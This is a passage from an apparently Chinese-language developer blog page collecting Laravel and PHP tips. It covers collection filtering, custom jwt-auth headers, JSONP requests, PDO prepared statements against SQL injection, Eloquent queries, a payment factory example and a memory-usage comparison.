Bennett'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Michael Dyrynda'</span>, <span class="string">'location'</span> =&gt; <span class="string">'AU'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">];</span><br><span class="line">以往，如果在一个查询语句上，还要有进一步的过滤条件，你可能需要这样写：</span><br><span class="line"></span><br><span class="line">$inUsa = collect($hosts)-&gt;where(<span class="string">'location'</span>, <span class="string">'USA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (request(<span class="string">'retired'</span>)) &#123;</span><br><span class="line">    $inUsa = $inUsa-&gt;filter(<span class="function"><span class="keyword">function</span>(<span class="params">$employee</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ! $employee[<span class="string">'is_active'</span>];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">通过 when 方法，你就可以在一个链式查询中完成所有的筛选过滤：https:<span class="comment">//learnku.com/laravel/t/26331</span></span><br><span class="line"></span><br><span class="line">$inUsa = collect($hosts)</span><br><span class="line">    -&gt;where(<span class="string">'location'</span>, <span class="string">'USA'</span>)</span><br><span class="line">    -&gt;when(request(<span class="string">'retired'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $collection-&gt;reject(<span class="function"><span class="keyword">function</span>(<span class="params">$employee</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $employee[<span class="string">'is_active'</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Jwtauth-自定义认证头信息"><a href="#Jwtauth-自定义认证头信息" class="headerlink" title="Jwtauth 自定义认证头信息"></a>Jwtauth 自定义认证头信息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">项目使用的 tymon/jwt-auth 包作为 token 的认证，过程中需要迁移项目，因为之前公司的 token 头部使用自定义的，并且他们还修改了包的头信息。就是下面头部信息。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26976</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthHeaders</span> <span class="title">implements</span> <span class="title">ParserContract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 下面这两处就是被修改的</span></span><br><span class="line">    protected $header = <span class="string">'authorization'</span>; </span><br><span class="line"></span><br><span class="line">    protected $prefix = <span class="string">'bearer'</span>;</span><br><span class="line">&#125;</span><br><span class="line">迁移项目过程了，因为拉取了新的包，所以还要去动包的信息，这是极其不合理的行为。所以就在包中尝试找到了更好的解决办法。如果在项目迁移过程中遇到了类似的问题该如何去做呢？这里只提供了我能想到的解决办法。需要在 AppServiceProvider 中加入该方法就可以了。</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">setAuthHeader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $chain = $<span class="keyword">this</span>-&gt;app[<span class="string">'tymon.jwt.parser'</span>]-&gt;getChain();</span><br><span class="line"></span><br><span class="line">        $chain[<span class="number">0</span>] = $chain[<span class="number">0</span>]-&gt;setHeaderPrefix(<span class="string">'项目的 token 前缀'</span>)-&gt;setHeaderName(<span class="string">'项目的头信息 key'</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;app[<span class="string">'tymon.jwt.parser'</span>]-&gt;setChain($chain);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ajax-实现跨域"><a href="#ajax-实现跨域" class="headerlink" title="ajax 实现跨域"></a>ajax 实现跨域</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">                <span class="keyword">async</span>: <span class="literal">true</span>,</span><br><span class="line">                url: <span class="string">"http://172.16.112.3/api.php"</span>,</span><br><span class="line">                type: <span class="string">"GET"</span>,</span><br><span class="line">                dataType: <span class="string">"jsonp"</span>, <span class="comment">// 返回的数据类型，设置为JSONP方式</span></span><br><span class="line">                jsonp: <span class="string">'callback'</span>, <span class="comment">//指定一个查询参数名称来覆盖默认的 jsonp 回调参数名 callback</span></span><br><span class="line">                jsonpCallback: <span class="string">'handleResponse'</span>, <span class="comment">//设置回调函数名</span></span><br><span class="line">                success: <span class="function"><span class="keyword">function</span> (<span class="params">response, status, xhr</span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'状态为：'</span> + status + <span class="string">',状态是：'</span> + xhr.statusText);</span><br><span class="line">                    <span class="built_in">console</span>.log(response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">原生 js 实现跨域</span><br><span class="line"></span><br><span class="line"> <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//定义一个处理Jsonp返回数据的回调函数</span></span><br><span class="line">            <span class="built_in">window</span>[<span class="string">"callback"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">object</span>) </span>&#123;</span><br><span class="line">                obj.success(object);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">            <span class="comment">//组合请求URL</span></span><br><span class="line">            script.src = obj.url + <span class="string">"?callback=callback"</span>;</span><br><span class="line">            <span class="keyword">for</span> (key <span class="keyword">in</span> obj.data) &#123;</span><br><span class="line">                script.src += <span class="string">"&amp;"</span> + key + <span class="string">"="</span> + obj.data[key];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将创建的新节点添加到BOM树上</span></span><br><span class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(script);</span><br><span class="line">        &#125;</span><br><span class="line">        jsonp(&#123;</span><br><span class="line">            url: <span class="string">"http://172.16.112.3/api.php"</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="PDO-防止-sql-注入"><a href="#PDO-防止-sql-注入" class="headerlink" title="PDO 防止 sql 注入"></a>PDO 防止 sql 注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setAttribute（） 这一行是强制性的，它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。这可以确保 SQL 语句和相应的值在传递到 mysql 服务器之前是不会被 PHP 解析的（禁止了所有可能的恶意 SQL 注入攻击）。虽然你可以配置文件中设置 字符集的属性 (charset=utf8)，但是需要格外注意的是，老版本的 PHP（ &lt; <span class="number">5.3</span><span class="number">.6</span>）在 DSN 中是忽略字符参数的。</span><br><span class="line">我们来看一段完整的代码使用实例：https:<span class="comment">//learnku.com/articles/27000#topnav</span></span><br><span class="line"></span><br><span class="line">  $user=$_POST[<span class="string">'user'</span>]; $pass=$_POST[<span class="string">'pass'</span>];</span><br><span class="line">  $dbh = <span class="keyword">new</span> \PDO(<span class="string">"mysql:host=localhost; dbname=zz"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">  $dbh-&gt;setAttribute(\PDO::ATTR_EMULATE_PREPARES, <span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//禁用prepared statements的仿真效果</span></span><br><span class="line"><span class="comment">//        $dbh-&gt;exec    ("set names 'utf8'");</span></span><br><span class="line">  $sql=<span class="string">"select * from test where user=? and pass=?"</span>;</span><br><span class="line">  $stmt = $dbh-&gt;prepare($sql);</span><br><span class="line">  $exeres = $stmt-&gt;execute(array($user, $pass));</span><br><span class="line">  <span class="keyword">if</span> ($exeres) &#123;</span><br><span class="line">  <span class="comment">//while条件为真时,输出$row,</span></span><br><span class="line">  <span class="keyword">while</span></span><br><span class="line">  ($row = $stmt-&gt;fetch(\PDO::FETCH_ASSOC))&#123;</span><br><span class="line">  print_r($row);die();</span><br><span class="line"> &#125;  <span class="comment">//失败输出登录失败</span></span><br><span class="line">  print_r(<span class="string">"登录失败"</span>);die();</span><br><span class="line"> &#125;</span><br><span class="line">当调用 prepare () 时，查询语句已经发送给了数据库服务器，此时只有占位符？发送过去，没有用户提交的数据；当调用到 execute () 时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL 攻击者没有一点机会。</span><br></pre></td></tr></table></figure>
<h3 id="Eloquent-关系中使用-orderBy"><a href="#Eloquent-关系中使用-orderBy" class="headerlink" title="Eloquent 关系中使用 orderBy()"></a>Eloquent 关系中使用 orderBy()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">productsByName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(Product::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">orderBy</span>('<span class="title">name</span>')</span>;</span><br><span class="line">&#125;</span><br><span class="line">$products = Product::whereDate(<span class="string">'created_at'</span>, <span class="string">'2018-01-31'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereMonth(<span class="string">'created_at'</span>, <span class="string">'12'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereDay(<span class="string">'created_at'</span>, <span class="string">'31'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereYear(<span class="string">'created_at'</span>, date(<span class="string">'Y'</span>))-&gt;get(); </span><br><span class="line">$products = Product::whereTime(<span class="string">'created_at'</span>, <span class="string">'='</span>, <span class="string">'14:13:58'</span>)-&gt;get();</span><br><span class="line">Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'account'</span>, <span class="string">'as'</span> =&gt; <span class="string">'account.'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Route::get(<span class="string">'login'</span>, <span class="string">'AccountController@login'</span>);     </span><br><span class="line">    Route::get(<span class="string">'register'</span>, <span class="string">'AccountController@register'</span>);</span><br><span class="line">    Route::group([<span class="string">'middleware'</span> =&gt; <span class="string">'auth'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;         </span><br><span class="line">        Route::get(<span class="string">'edit'</span>, <span class="string">'AccountController@edit'</span>);     </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">恢复多个软删除https:<span class="comment">//learnku.com/articles/26673 </span></span><br><span class="line"></span><br><span class="line">如果记录使用了软删除，那么你就可以一次恢复多条软删除记录。</span><br><span class="line"></span><br><span class="line">Post::withTrashed()-&gt;where(<span class="string">'author_id'</span>, <span class="number">1</span>)-&gt;restore();</span><br><span class="line"><span class="comment">// Author -&gt; hasMany(Book::class) </span></span><br><span class="line">$authors = Author::has(<span class="string">'books'</span>, <span class="string">'&gt;'</span>, <span class="number">5</span>)-&gt;get();</span><br><span class="line">$users = User::all([<span class="string">'id'</span>, <span class="string">'name'</span>, <span class="string">'email'</span>]);</span><br><span class="line">在执行 Eloqument 查询后，你可以使用 map() 来修改行。</span><br><span class="line"></span><br><span class="line">$users = User::where(<span class="string">'role_id'</span>, <span class="number">1</span>)-&gt;get()-&gt;map(<span class="function"><span class="keyword">function</span> (<span class="params">User $user</span>) </span>&#123;</span><br><span class="line">    $user-&gt;some_column = some_function($user);</span><br><span class="line">    <span class="keyword">return</span> $user;</span><br><span class="line">&#125;);</span><br><span class="line">当一个关系被调用时，如果它不存在，则会出现致命的错误，例如 $post-&gt;user-&gt;name ，可以使用 withDefault() 来避免。</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 获取文章作者 */</span> </span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;belongsTo(<span class="string">'App\User'</span>)-&gt;withDefault(); </span><br><span class="line">&#125;</span><br><span class="line">$users = App\Book::<span class="keyword">with</span>(<span class="string">'author:id,name'</span>)-&gt;get();</span><br></pre></td></tr></table></figure>
<h3 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">　Controller 类，只接受用户输入，返回输出，不需要具体处理背后的事情。当需要表单验证的时候，注入相应的 Request 类。当需要数据操作时，注入相应的 Repository 或 Service 或 Factory。</span><br><span class="line"></span><br><span class="line">　　Model 类，将修改器，访问器定义在 trait 然后 use 进来。数据操作逻辑分离成 Repository。</span><br><span class="line"></span><br><span class="line">　　Helper.php 全局函数，将同类型的 helper 分离成单独的文件，使其高内聚。然后在 Helper.php 中引入</span><br><span class="line">所有具体的类都需要实现 Interface 中定义的方法。</span><br><span class="line">在 Factory 中实例化具体的类。</span><br><span class="line">在 Controller 中使用 Factory。</span><br><span class="line"></span><br><span class="line">首先创建一个 PaymentInterface，任何支付方式都必须实现此接口中定义的方法。</span><br><span class="line"></span><br><span class="line">interface PaymentInterface &#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function">接着，创建两个实现 <span class="title">PaymentInterface</span> 的具体类。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">Alipay</span> <span class="title">implements</span> <span class="title">PaymentInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 支付宝支付具体代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wechat</span> <span class="title">implements</span> <span class="title">PaymentInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 微信支付具体代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">然后，创建一个支付工厂，此工厂用来实例化具体的支付类</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeymentFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$payType</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($payType) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Alipay'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Alipay();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Wechat'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Wechat();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'未知支付方式'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">最后，在控制器中注入此 Factory</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">pay</span> (<span class="params">Request $request, PaymentFactory $paymentFactory</span>) </span>&#123;</span><br><span class="line">    $payment = $paymentFactory-&gt;init($request-&gt;payType);</span><br><span class="line">    $payment-&gt;pay();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="内存占用高，速度就会提高"><a href="#内存占用高，速度就会提高" class="headerlink" title="内存占用高，速度就会提高"></a>内存占用高，速度就会提高</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'class a __construct'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a1'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a2'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'a3'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/laravel/t/27033</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    protected $cache;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'class b __construct'</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b1</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b2</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $cache=[];</span><br><span class="line">        <span class="keyword">if</span>(isset($cache[$tags])) <span class="keyword">return</span> $cache[$tags];</span><br><span class="line">        <span class="keyword">return</span> $cache[$tags]=<span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b3</span>(<span class="params">$tags=<span class="string">'tags'</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($<span class="keyword">this</span>-&gt;cache[$tags])) <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache[$tags];</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache[$tags]=<span class="keyword">new</span> a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b1()-&gt;a1();</span><br><span class="line">$b-&gt;b1()-&gt;a2();</span><br><span class="line">$b-&gt;b1()-&gt;a3();</span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b2()-&gt;a1();</span><br><span class="line">$b-&gt;b2()-&gt;a2();</span><br><span class="line">$b-&gt;b2()-&gt;a3();</span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$start = memory_get_usage();</span><br><span class="line">$b=<span class="keyword">new</span> b();</span><br><span class="line">$b-&gt;b3()-&gt;a1();</span><br><span class="line">$b-&gt;b3()-&gt;a2();</span><br><span class="line">$b-&gt;b3()-&gt;a3();</span><br><span class="line"><span class="comment">/*内存计算*/</span></span><br><span class="line">$end = memory_get_usage();</span><br><span class="line">echo ($end-$start).<span class="string">"\n"</span>;</span><br><span class="line">内存占用高，速度就会提高，反之，就速度就会降低，上面那个 b1 和 b2 后面应该加一个 unset ($b), 内存计算才准确吧</span><br><span class="line">这应该就是连接数据库的时候为什么推荐使用短链接而不是长链接的原因吧，长连接占用内存高，资源多吧，不即时释放</span><br><span class="line"></span><br><span class="line">调用第二个 b1 的时候，第一个 b1 创建出来的 a 就被销毁了啊，就不占内存了啊。</span><br><span class="line">这题还有一个目的，在同一个进程下想减少 <span class="keyword">new</span> 的次数，结果画蛇添足了</span><br></pre></td></tr></table></figure>
<h3 id="关联模型字段取别名查询不出数据"><a href="#关联模型字段取别名查询不出数据" class="headerlink" title="关联模型字段取别名查询不出数据"></a>关联模型字段取别名查询不出数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/22489#topnav</span></span><br><span class="line">laravel 自带的 ORM 是个神器，针对这种有关系的数据，完全可以使用关系模型，既简单又实用，由于这里只有一个数据表，关系也存在于同一张表，所以可以直接使用自关联，将两个关系定义在同一个 Model 里面：</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasOne($<span class="keyword">this</span>, <span class="string">'id'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">children</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany($<span class="keyword">this</span>, <span class="string">'parent_id'</span>, <span class="string">'id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">关系定义里面的参数也可以这样写：</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasOne(get_class($<span class="keyword">this</span>), $<span class="keyword">this</span>-&gt;getKeyName(), <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">children</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(get_class($<span class="keyword">this</span>), <span class="string">'parent_id'</span>, $<span class="keyword">this</span>-&gt;getKeyName());</span><br><span class="line">    &#125;</span><br><span class="line">查询包含子菜单的数据</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> 